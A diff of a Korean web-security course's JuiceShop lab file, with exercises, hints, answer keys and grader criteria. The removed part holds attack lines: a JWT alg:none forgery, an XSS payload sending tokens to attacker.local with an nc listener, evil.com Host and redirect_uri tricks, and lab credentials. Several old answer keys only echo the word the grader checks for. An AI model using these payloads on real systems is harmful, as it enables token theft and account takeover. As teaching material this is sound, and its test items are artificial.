-    jwt_tool. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 세션 하이재킹 시뮬레이션 관련 도구와 기법을 활용하세요.
-  category: session
-  points: 12
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 세션 하이재킹 시뮬레이션을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 하이재킹\
-    \ 시뮬레이션 완료'"
-  answer_detail: 세션 하이재킹 시뮬레이션은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect:
-    - 완료
-    - hijack
-    field: stdout
-    semantic:
-      intent: 세션 하이재킹 시뮬레이션 — 타인의 세션 쿠키 탈취 가정 후 해당 쿠키로 요청해 권한 이관 여부 확인
+      ```markdown
+      # JuiceShop 인증/세션 점검 보고서 (W04)
+
+      ## 1. 점검 범위
+      대상: http://juice.6v6.lab/ (JuiceShop)
+      범위: /rest/user/login, Set-Cookie 헤더, 세션 토큰
+      기간: <학생 작성>
+
+      ## 2. 발견 사항 (5)
+
+      ### F-01: 약한 default 자격증명
+      - 위험도: High (CVSS 7~9)
+      - 증거: admin@juice-sh.op / admin123 로그인 성공 (STEP 1)
+      - 권고: 운영 환경 default credential 변경 의무화 + 첫 로그인 시 강제 변경
+
+      ### F-02: 약한 비밀번호 (brute force 가능)
+      - 위험도: High
+      - 증거: STEP 2 hydra 결과 — N 단어 시도 중 admin123 match
+      - 권고: 비밀번호 정책 (length 12+, complexity) + lockout (5 fail 시 15 분)
+
+      ### F-03: 쿠키 속성 결손 (STEP 3 결과 인용)
+      - ...
+
+      ### F-04: 세션 고정 위험 (STEP 4 결과)
+      - ...
+
+      ### F-05: 인증 우회 (단순 SQLi — STEP 5 결과)
+      - ...
+
+      ## 3. 종합 의견 + 우선순위
+      - 즉시 수정: F-01, F-05 (Critical)
+      - 단기 수정: F-02 (lockout 정책)
+      - 중기 수정: F-03, F-04
+      ```
+
+      ## 💡 왜 이걸 하는가?
+
+      보고서 작성 = 점검 의 *실질 산출물*. 운영팀 / 의사결정자 가 *어떤 finding 부터
+      수정 해야 하는지* 우선순위 + 권고. W14 의 본격 보고서 작성 의 base.
+
+      ## 📋 채점 기준
+
+      - 5 finding 모두 포함
+      - 각 finding 의 위험도 + 증거 + 권고 1~2 줄
+      - 우선순위 + 학생 본인 의견
+    hint: "OWASP Top 10 의 A07 + A03 + A02 매핑 도 가능. 위험도 = CVSS 기반 (W08 중간고사 의 본격 주제)."
+    category: documentation
+    points: 14
+    answer: |
+      🤖 자기학습용 정답 가이드:
+      # markdown 5 finding (F-01 ~ F-05) + 종합 의견 — 위 instruction 의 example 참조.
+      # 핵심: STEP 1~5 의 실제 결과 인용 + 학생 본인 의 위험도 + 권고.
+    answer_detail: |
+      JuiceShop 점검 의 인증 결함 5 finding 의 운영 환경 매핑: F-01 (default
+      credential) = OWASP A07, F-02 (weak password / brute force) = A07, F-03
+      (쿠키 속성) = A05, F-04 (세션 고정) = A07, F-05 (인증 우회 SQLi) = A03.
+      운영 환경 점검 보고서 의 raw material.
+    verify:
+      intent: "5 finding markdown 보고서 + 위험도/증거/권고 + 우선순위"
       success_criteria:
-      - 쿠키 복제 후 curl -b 또는 브라우저 DevTools 로 대체 로그인
-      - 세션 소유자 식별 응답(프로필 페이지 등) 확인
-      - HttpOnly/Secure 누락이 탈취 경로 확장 설명
+        - "5 finding 모두 포함"
+        - "위험도 + 증거 + 권고 각 1~2 줄"
+        - "우선순위 + 학생 본인 의견"
       acceptable_methods:
-      - curl -b "session=<hijacked>" <protected_url>
-      - browser cookie editor extension
-      - python requests cookies={...}
-      - BeEF cookie steal module
+        - "markdown 또는 plaintext"
+        - "OWASP A07/A03 매핑 도 환영"
       negative_signs:
-      - 쿠키 재사용 없이 개념만
-      - 권한 이관 확인 없음
-      - HttpOnly/Secure 언급 없음
-  target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 하이재킹\
-    \ 시뮬레이션 완료'"
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 세션 하이재킹 시뮬레이션을(를) 수행해줘
+        - "5 중 일부 누락"
+        - "권고 없이 증거 만"
+        - "우선순위 없음"
+    target_vm: bastion
+    risk_level: low
 
+  - order: 7
+    instruction: |
+      ## 🎯 MISSION — cleanup + Blue dashboard 검증
 
-    [도구 권장] session: curl -c cookie.jar -b cookie.jar, jwt_tool. curl 만 쓰지 말고 **curl
-    -c cookie.jar -b cookie.jar** 등 적합 도구로 호출 후 stdout quote.'
-- order: 7
-  instruction: '{{WEB_IP}} 대상으로 JWT 토큰 구조 분석을(를) 수행하시오.
+      **어디서:** attacker 컨테이너 + 학생 PC 브라우저 (Wazuh dashboard)
+      **무엇을:**
+      1. STEP 2~5 에서 만든 /tmp 파일 정리 (`/tmp/pw.txt`, `/tmp/before.txt`, `/tmp/after.txt`, `/tmp/sqli.json`)
+      2. **Blue 측 검증**: Wazuh dashboard (`https://siem.6v6.lab/`) 접속 → Discover → 본 lab 시간대 의 alert 확인. 어떤 rule 이 가동 했나?
 
+      **결과 어떻게 정리:**
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `jwt` 에 적합한 도구: jwt_tool (decode/forge/none/alg
-    confusion), curl + Authorization 헤더. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote**
-    해야 채점 통과.'
-  hint: JWT 토큰 구조 분석 관련 도구와 기법을 활용하세요.
-  category: jwt
-  points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 JWT 토큰 구조 분석을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 토큰 구조\
-    \ 분석 완료'"
-  answer_detail: JWT 토큰 구조 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect:
-    - 완료
-    - 10.20.32.80
-    field: stdout
-    semantic:
-      intent: JWT 토큰 구조 분석 — 3부(Header.Payload.Signature) Base64URL 디코드 후 alg·type·클레임
-        확인
+      ```
+      cleanup: rm -f ... 명령 + 결과 (해당 file 없음 확인)
+
+      Blue dashboard 의 본 lab 시간대 alert:
+        - rule.id: <발견 한 룰 id>
+        - rule.description: <설명>
+        - count: <건수>
+        - 학생 본인 1 문장 해석: 본 lab 의 Red 활동 중 어느 단계 가 가장 강한 alert 를 만들었나
+      ```
+
+      ## 💡 왜 이걸 하는가?
+
+      Blue 의 actual alert 확인 = R/B/P cycle 의 완성. Red 가 한 활동 이 Blue
+      에서 어떻게 보이는지 한 번 직접 확인 하면, 다음 주차 의 점검 시 *어떤 활동
+      이 자기 식별 위험 큰지* 판단 가능.
+
+      ## 📋 채점 기준
+
+      - cleanup 실행 + 결과
+      - dashboard 의 alert 1+ rule.id 인용
+      - 학생 본인 해석 1 문장
+    hint: "dashboard URL = https://siem.6v6.lab/ (학생 PC /etc/hosts 에 192.168.0.110 매핑). admin/SecretPassword. KQL: `agent.name:web AND @timestamp:>now-30m`."
+    category: cleanup
+    points: 10
+    answer: |
+      🤖 자기학습용 정답 가이드:
+      rm -f /tmp/pw.txt /tmp/before.txt /tmp/after.txt /tmp/sqli.json /tmp/m.out 2>/dev/null
+      ls /tmp/pw.txt /tmp/before.txt 2>&1 | head -2
+      # dashboard 의 alert 확인 = 브라우저 활동, 학생 보고서 에 screenshot 또는 KQL 결과.
+    answer_detail: |
+      hydra 의 brute force = Wazuh rule 5710 (multiple failed login) 가동 가능. SQLi
+      payload (STEP 5) = ModSecurity CRS 942100 (SQL injection) → Wazuh rule 100002+ 매핑.
+      JuiceShop 자체 가 의도적 vulnerable 이라 ModSec block 안 함 — alert 만 발생.
+    verify:
+      intent: "cleanup + dashboard 의 본 lab alert 확인 + 학생 해석"
       success_criteria:
-      - JWT Base64URL 디코드 명령 또는 jwt.io 예시
-      - Header alg·Payload (iat, exp, sub) 클레임 최소 2개 해석
-      - 서명 검증 필요성 설명
+        - "cleanup 명령 + 확인"
+        - "dashboard 의 rule.id 1+ 인용"
+        - "학생 1 문장 해석"
       acceptable_methods:
-      - echo <jwt> | cut -d. -f1 | base64 -d
-      - python jose/PyJWT 라이브러리
-      - jwt_tool --decode
-      - jwt.io 페이스트
+        - "Wazuh dashboard 또는 직접 ssh siem 의 alerts.json grep"
+        - "rule.id 없으면 *왜 없는지* 분석"
       negative_signs:
-      - Base64 디코드 없음
-      - 클레임 해석 없음
-      - 서명 개념 누락
-  target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 토큰 구조\
-    \ 분석 완료'"
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 JWT 토큰 구조 분석을(를) 수행해줘
-
-
-    [도구 권장] jwt: jwt_tool (decode/forge/none/alg confusion), curl + Authorization
-    헤더. curl 만 쓰지 말고 **jwt_tool (decode/forge/none/alg confusion)** 등 적합 도구로 호출 후
-    stdout quote.'
-- order: 8
-  instruction: '{{WEB_IP}} 대상으로 JWT 서명 검증 우회 테스트을(를) 수행하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `jwt` 에 적합한 도구: jwt_tool (decode/forge/none/alg
-    confusion), curl + Authorization 헤더. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote**
-    해야 채점 통과.'
-  hint: JWT 서명 검증 우회 테스트 관련 도구와 기법을 활용하세요.
-  category: jwt
-  points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 JWT 서명 검증 우회 테스트을(를) 수행해줘\n\U0001F4CE\
-    \ 참고 (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 서명 검증\
-    \ 우회 테스트 완료'"
-  answer_detail: JWT 서명 검증 우회 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect:
-    - 완료
-    - jwt
-    field: stdout
-    semantic:
-      intent: JWT 서명 검증 우회 — alg:none, 공개키 혼동(HS256 with RSA pubkey), 약한 HMAC 키 크래킹
-      success_criteria:
-      - alg:none 변조 후 서명 제거 공격 예시
-      - HS256↔RS256 알고리즘 confusion 개념
-      - jwt_tool 또는 hashcat 로 HMAC 키 brute
-      acceptable_methods:
-      - jwt_tool <token> -X a none
-      - jwt_tool <token> -X k <pubkey.pem>
-      - hashcat -m 16500 jwt_hashes
-      - python PyJWT decode without verify
-      negative_signs:
-      - 알고리즘 조작 없이 일반 decode 만
-      - 공개키 혼동 개념 누락
-      - 약한 키 공격 언급 없음
-  target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 서명 검증\
-    \ 우회 테스트 완료'"
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 JWT 서명 검증 우회 테스트을(를) 수행해줘
-
-
-    [도구 권장] jwt: jwt_tool (decode/forge/none/alg confusion), curl + Authorization
-    헤더. curl 만 쓰지 말고 **jwt_tool (decode/forge/none/alg confusion)** 등 적합 도구로 호출 후
-    stdout quote.'
-- order: 9
-  instruction: '{{WEB_IP}} 대상으로 JWT 알고리즘 변조 공격을(를) 수행하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `jwt` 에 적합한 도구: jwt_tool (decode/forge/none/alg
-    confusion), curl + Authorization 헤더. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote**
-    해야 채점 통과.'
-  hint: JWT 알고리즘 변조 공격 관련 도구와 기법을 활용하세요.
-  category: jwt
-  points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 JWT 알고리즘 변조 공격을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 알고리즘\
-    \ 변조 공격 완료'"
-  answer_detail: JWT 알고리즘 변조 공격은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect: 완료
-    field: stdout
-    semantic:
-      intent: JWT 알고리즘 변조 — header alg 를 none/HS256/RS256 간 변조 후 서명 재계산·무효화
-      success_criteria:
-      - Header alg 변경 방법(base64 재인코딩) 설명
-      - 서버가 alg 값을 신뢰하면 인증 우회 성공
-      - '방어: alg 화이트리스트, 서명 알고리즘 서버 강제'
-      acceptable_methods:
-      - jwt_tool -X 옵션
-      - python jose 로 수동 재서명
-      - Burp JWT Editor extension
-      - curl -H Authorization:Bearer <forged>
-      negative_signs:
-      - Header 변조 시도 없음
-      - 서명 재생성 단계 누락
-      - 방어 기법 없음
-  target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 알고리즘\
-    \ 변조 공격 완료'"
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 JWT 알고리즘 변조 공격을(를) 수행해줘
-
-
-    [도구 권장] jwt: jwt_tool (decode/forge/none/alg confusion), curl + Authorization
-    헤더. curl 만 쓰지 말고 **jwt_tool (decode/forge/none/alg confusion)** 등 적합 도구로 호출 후
-    stdout quote.'
-- order: 10
-  instruction: '{{WEB_IP}} 대상으로 패스워드 리셋 취약점 분석을(를) 수행하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
-    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 패스워드 리셋 취약점 분석 관련 도구와 기법을 활용하세요.
-  category: auth
-  points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 패스워드 리셋 취약점 분석을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 리셋\
-    \ 취약점 분석 완료'"
-  answer_detail: 패스워드 리셋 취약점 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect:
-    - 완료
-    - http_request
-    - 10.20.32.80
-    field: stdout
-    semantic:
-      intent: 패스워드 리셋 취약점 — 리셋 토큰 추측·재사용·호스트헤더 변조로 피싱 링크 주입
-      success_criteria:
-      - 리셋 토큰 엔트로피 분석 (짧거나 순차적이면 취약)
-      - Host 헤더 변조로 리셋 링크 도메인 탈취 가능성 테스트
-      - 토큰 만료·1회 사용·이메일 인증 필수 방어 언급
-      acceptable_methods:
-      - curl -H Host:evil.com /reset
-      - 여러 리셋 요청 후 토큰 비교
-      - Burp Collaborator 로 콜백 수신
-      - python requests 로 자동 재사용 테스트
-      negative_signs:
-      - 토큰 엔트로피 분석 없음
-      - Host 헤더 공격 개념 부재
-      - 방어 언급 없음
-  target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 리셋\
-    \ 취약점 분석 완료'"
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 패스워드 리셋 취약점 분석을(를) 수행해줘
-
-
-    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
-    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
-- order: 11
-  instruction: '{{WEB_IP}} 대상으로 2FA 우회 가능성 분석을(를) 수행하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
-    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 2FA 우회 가능성 분석 관련 도구와 기법을 활용하세요.
-  category: auth
-  points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 2FA 우회 가능성 분석을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '2FA 우회 가능성\
-    \ 분석 완료'"
-  answer_detail: 2FA 우회 가능성 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect:
-    - 완료
-    - 10.20.32.80
-    field: stdout
-    semantic:
-      intent: 2FA 우회 가능성 분석 — 응답 조작, SMS 재전송 abuse, 백업 코드 무제한 시도, OAuth 우회
-      success_criteria:
-      - 2FA 엔드포인트 응답 코드/본문 분석
-      - 우회 기법 최소 2가지 (HTTP verb swap, response manipulation, 백업 코드) 제시
-      - 방어 (rate limit on 2FA, device trust, backup code 제한) 언급
-      acceptable_methods:
-      - Burp Repeater 로 응답 코드 변경
-      - python requests 로 2FA 우회 시도
-      - OWASP ASVS V2.8 참조
-      - yubikey 등 FIDO2 제안
-      negative_signs:
-      - 우회 기법 1개만
-      - rate limit 관점 없음
-      - FIDO2/하드웨어 토큰 언급 없음
-  target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '2FA 우회 가능성\
-    \ 분석 완료'"
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 2FA 우회 가능성 분석을(를) 수행해줘
-
-
-    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
-    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
-- order: 12
-  instruction: '{{WEB_IP}} 대상으로 OAuth 취약점 분석을(를) 수행하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
-    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: OAuth 취약점 분석 관련 도구와 기법을 활용하세요.
-  category: auth
-  points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 OAuth 취약점 분석을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'OAuth 취약점\
-    \ 분석 완료'"
-  answer_detail: OAuth 취약점 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect:
-    - 완료
-    - OAuth
-    field: stdout
-    semantic:
-      intent: OAuth 취약점 — redirect_uri 변조, state 누락으로 CSRF, 토큰 탈취, Open Redirect 악용
-      success_criteria:
-      - redirect_uri 조작으로 토큰 다른 도메인 전달 시도
-      - state 매개변수 부재가 CSRF 를 유발함 설명
-      - implicit flow vs authorization code + PKCE 비교
-      acceptable_methods:
-      - curl 로 redirect_uri=https://evil.com 시도
-      - Burp 로 state 제거 후 재전송
-      - OAuth 2.0 Security BCP 참조
-      - PKCE 강제 확인
-      negative_signs:
-      - redirect_uri 공격 언급 없음
-      - state/PKCE 누락
-      - OAuth Flow 차이 설명 없음
-  target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'OAuth 취약점\
-    \ 분석 완료'"
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 OAuth 취약점 분석을(를) 수행해줘
-
-
-    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
-    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
-- order: 13
-  instruction: '{{WEB_IP}} 대상으로 안전한 세션 관리 구현 방안을(를) 수행하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
-    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 안전한 세션 관리 구현 방안 관련 도구와 기법을 활용하세요.
-  category: defense
-  points: 10
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 안전한 세션 관리 구현 방안을(를) 수행해줘
-
-    📎 참고 (CLI): echo ''=== 안전한 세션 관리 구현 방안 ==='' && echo ''조치 방안 정리 완료'''
-  answer_detail: 안전한 세션 관리 구현 방안은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect: 완료
-    field: stdout
-    semantic:
-      intent: 안전한 세션 관리 — HttpOnly/Secure/SameSite 쿠키 + 랜덤 세션 ID(>=128bit) + 로그인 후
-        세션 재생성 + 적절한 만료
-      success_criteria:
-      - 쿠키 속성 3개(HttpOnly/Secure/SameSite) 설정 권장
-      - 세션 ID 엔트로피 >=128bit 권고
-      - 로그아웃·비활성 타임아웃·절대 만료 언급
-      acceptable_methods:
-      - OWASP Session Management Cheat Sheet
-      - Express-session 설정 예
-      - Django SESSION_COOKIE_* 설정
-      - iron-session / NextAuth 등 라이브러리
-      negative_signs:
-      - 방어 요소 2개 이하
-      - 세션 재생성 누락
-      - 만료 정책 없음
-  target_vm: attacker
-  script: echo '=== 안전한 세션 관리 구현 방안 ===' && echo '조치 방안 정리 완료'
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 안전한 세션 관리 구현 방안을(를) 수행해줘
-
-
-    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
-    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
-- order: 14
-  instruction: '{{WEB_IP}} 대상으로 인증 강화 권고 작성을(를) 수행하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
-    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 인증 강화 권고 작성 관련 도구와 기법을 활용하세요.
-  category: defense
-  points: 12
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 인증 강화 권고 작성을(를) 수행해줘
-
-    📎 참고 (CLI): echo ''=== 인증 강화 권고 작성 ==='' && echo ''조치 방안 정리 완료'''
-  answer_detail: 인증 강화 권고 작성은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect: 완료
-    field: stdout
-    semantic:
-      intent: 인증 강화 권고 — MFA 의무화, 패스워드리스, WebAuthn/FIDO2, 로그인 이상행위 탐지(UEBA)
-      success_criteria:
-      - MFA 종류 2개 이상 언급 (TOTP, FIDO2, Push)
-      - WebAuthn/Passkey 개념
-      - 이상행위(UEBA) 로그인 탐지 지표 제시
-      acceptable_methods:
-      - Google/Microsoft Account 2FA 옵션
-      - NIST SP 800-63B AAL1-3 레벨
-      - Auth0/Okta 스몰빌
-      - Wazuh 또는 Splunk UEBA 상관규칙
-      negative_signs:
-      - MFA 1가지만
-      - WebAuthn/Passkey 누락
-      - UEBA 개념 없음
-  target_vm: attacker
-  script: echo '=== 인증 강화 권고 작성 ===' && echo '조치 방안 정리 완료'
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 인증 강화 권고 작성을(를) 수행해줘
-
-
-    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
-    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
-- order: 15
-  instruction: '인증/세션 취약점 실습 종합 보고서를 작성하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `verification` 에 적합한 도구: curl/jq 로 PoC 재현 + 결과
-    비교. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 발견 취약점, 영향, 조치를 포함하세요.
-  category: verification
-  points: 8
-  answer: '🤖 프롬프트: 인증/세션 취약점 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
-
-    📎 참고 (CLI): echo ''=== 인증/세션 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.32.80''
-    && echo ''=== 보고서 완료 ==='''
-  answer_detail: 취약점 진단 보고서는 발견사항, 위험도, 재현 방법, 조치 권고를 포함합니다.
-  verify:
-    type: output_contains
-    expect:
-    - 보고서 완료
-    - 10.20.32.80
-    - OAuth2
-    - report
-    field: stdout
-    semantic:
-      intent: 인증/세션 실습 종합 리포트 — 분석·Exploit·방어 전략을 /tmp/auth_session_report.txt 로 정리
-      success_criteria:
-      - 4 섹션 이상 (로그인/세션/JWT/OAuth·MFA)
-      - PoC 또는 탐지 로그 1개 이상
-      - 파일 저장 후 cat 확인
-      acceptable_methods:
-      - heredoc markdown
-      - echo -e 다줄
-      - json/yaml 구조화
-      - python 템플릿
-      negative_signs:
-      - 섹션 2 미만
-      - PoC 없음
-      - 파일 저장 없음
-  target_vm: attacker
-  script: 'echo ''=== 인증/세션 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.32.80'' &&
-    echo ''=== 보고서 완료 ==='''
-  risk_level: low
-  bastion_prompt: '인증/세션 취약점 실습 종합 보고서를 작성하시오.
-
-
-    [도구 권장] verification: curl/jq 로 PoC 재현 + 결과 비교. curl 만 쓰지 말고 **curl/jq 로 PoC 재현
-    + 결과 비교** 등 적합 도구로 호출 후 stdout quote.'
-- order: 99
-  instruction: '[복합 시나리오] "JWT 알고리즘 변조 + XSS 토큰 탈취 chain — 인증 자격증명 체인 공격"
-
-
-    ■ 상황 (w05 → w06 시나리오 연속)
-
-
-    w05 에서 SQLi·Upload 매트릭스를 마쳤다. 선배가 다음.
-
-
-    ※ 선배: "단일 취약점은 어렵지 않은데, 진짜 위험은 *체인* 이야.
-
-    ※ JWT 가 alg=none 으로 변조되면 서명 우회. 거기다 XSS 가 있으면 localStorage 의 토큰을 빼낼 수 있고.
-
-    ※ 둘 다 막혀 있으면 안전하지만, 한쪽만 뚫려도 *권한 상승 + 자격증명 탈취* 가 동시에 발생해.
-
-    ※ JuiceShop 에서 JWT 변조 PoC 만들고, XSS payload 로 토큰 탈취 시연 + 방어 매트릭스 정리해."
-
-
-    학습 목표 (lecture #1·#2 XSS 3 유형 + #3 CSRF) + (lab #7·#8·#9 JWT 변조 + #6 세션 하이재킹)
-    통합.
-
-
-    ■ 임무 (3 단계, 약 35분)
-
-
-    ▶ Phase A — JWT 알고리즘 변조 (lab #7·#8·#9)
-
-    Phase 1) `curl -s -X POST -H "Content-Type: application/json"
-
-    -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' http://10.20.32.80/rest/user/login`
-    로 JWT 획득.
-
-    Phase 2) header 에서 `{"alg":"HS256"...}` → `{"alg":"none"...}` 변조. 서명 부분 제거.
-
-    Phase 3) `python3 -c "import base64; h=base64.urlsafe_b64encode(b''{\"alg\":\"none\",\"typ\":\"JWT\"}'').rstrip(b''='').decode();
-    ..."` 형태로
-
-    변조 토큰 생성. `curl -H "Authorization: Bearer <변조>" http://10.20.32.80/rest/user/whoami`
-    로 인증 우회 시도.
-
-
-    ▶ Phase B — XSS payload 로 JWT 탈취 (lecture #1·#2)
-
-    JuiceShop 의 search 또는 review 입력란에 stored 또는 reflected XSS payload 작성.
-
-    Payload: `<script>fetch(''http://attacker.local/steal?t=''+localStorage.getItem(''token''))</script>`
-
-    PoC 로 텍스트 출력. 실제 외부 callback 은 환경 제약 → curl 로 attacker 측 수신 시뮬레이션:
-
-    `nc -lk 9999 &` 후 `curl "http://localhost:9999/steal?t=$(JWT)"`.
-
-
-    ▶ Phase C — 인증 자격증명 방어 매트릭스
-
-    | 위협 | 공격면 | 방어 1 | 방어 2 | 잔존 위험 |
-
-    | JWT alg 변조 | server alg whitelist | strict alg check | RS256 사용 | key leak |
-
-    | localStorage 탈취 | XSS | HttpOnly Cookie 사용 | CSP 설정 | XSS+CSRF chain |
-
-    | Cookie 탈취 | XSS + Cookie 접근 | HttpOnly + Secure | SameSite=Strict | network
-    mitm |
-
-    | Refresh token 탈취 | 영구 자격증명 | rotation + short TTL | device binding | refresh
-    leak |
-
-    표 끝에 "JuiceShop 권고: alg whitelist + HttpOnly Cookie + SameSite=Strict + refresh
-    rotation" 한 줄.
-
-
-    종료: echo "=== Phase A JWT 변조 ===" / "=== Phase B XSS 탈취 ===" / "=== Phase C 매트릭스
-    ===" 묶음.
-
-
-
